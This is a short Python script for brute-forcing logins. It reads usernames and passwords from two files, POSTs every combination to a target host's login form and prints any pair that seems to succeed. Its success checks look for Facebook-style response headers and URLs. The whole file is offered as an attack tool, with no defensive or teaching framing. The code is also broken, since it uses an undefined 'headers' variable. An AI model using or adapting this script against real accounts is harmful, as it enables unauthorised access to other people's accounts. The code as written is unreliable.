"Given Target IP/Domain + Port + file -> BruteForce the Username/Pass."
import http.client
import urllib.parse
from colorama import init, Fore, Back, Style

init()

TARGET = input("Target URL/IP: ")
PORT = input("Target Port(default 80): ")

username_file = open('user.txt')
password_file = open('pwd.txt')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()

        print(user, "-", pwd)
        
        post_parameters = urllib.parse.urlencode({'email': user,
                                                  'pass': pwd,
                                                  'login': "Submit"})

        conn = http.client.HTTPConnection(TARGET, PORT, timeout=10)
        
        conn.request("POST", "/", post_parameters, headers)
        response = conn.getresponse()

        if (response.getheader('path') == "/ajax/webstorage/process_keys/?state=0"):
            print("Logged with:", user, " - ", pwd)
        elif (response.getheader('referer') == "https://www.facebook.com/home.php"):
            print("Logged with:", user, " - ", pwd)


username_file.close()
password_file.close()
